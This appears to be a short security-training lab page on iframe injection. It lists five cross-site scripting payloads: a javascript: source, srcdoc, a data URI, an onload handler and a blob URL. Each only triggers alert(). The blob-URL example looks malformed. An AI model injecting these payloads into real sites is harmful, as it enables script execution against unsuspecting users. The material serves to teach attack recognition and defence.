📚 Lab 8.1.E: IFrame Injection

Embed malicious iframes that can execute arbitrary code. IFrames can use the javascript: protocol to execute scripts directly in the iframe context.

💡 IFrame Injection Techniques:

JavaScript protocol:

<iframe src="javascript:alert('XSS')"></iframe>

Inline HTML:

<iframe srcdoc="<script>alert('XSS')</script>"></iframe>

Data URI:

<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>

Onload handler:

<iframe onload="alert('IFrame loaded')"></iframe>

Blob URL:

<iframe src="blob:data:text/html,<script>alert('XSS')</script>"></iframe>
